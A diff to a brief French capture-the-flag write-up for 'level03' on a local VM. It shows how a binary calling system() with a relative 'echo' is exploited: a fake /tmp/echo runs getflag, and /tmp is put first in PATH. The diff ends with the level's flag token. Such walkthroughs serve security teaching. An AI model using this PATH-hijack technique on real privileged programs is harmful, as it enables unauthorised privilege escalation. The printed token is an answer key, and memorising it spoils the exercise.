@@ -1,14 +1,13 @@
 Dans un terminal hors de la VM pour pouvoir telecharger level03 :
 >scp -P 4242 level03@192.168.56.101:/home/user/level03/level03 .
 
-ghidra >
+ghidra > dans ghidra on voit que le main utilise la fonction system qui utilse la fonction env puis echo donc on peut ajouter un echo 
+car il n'est pas protege dans le main ( pas le chemin absolue )
 
->cd /tmp/
-    vim echo > #!/bin/bash
-                getflag
+>echo getflag > /tmp/echo
 
->chmod 777 echo
+>chmod 777 /tmp/echo
 
->cd ..
 >export PATH=/tmp:$PATH
 >./level03
+    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
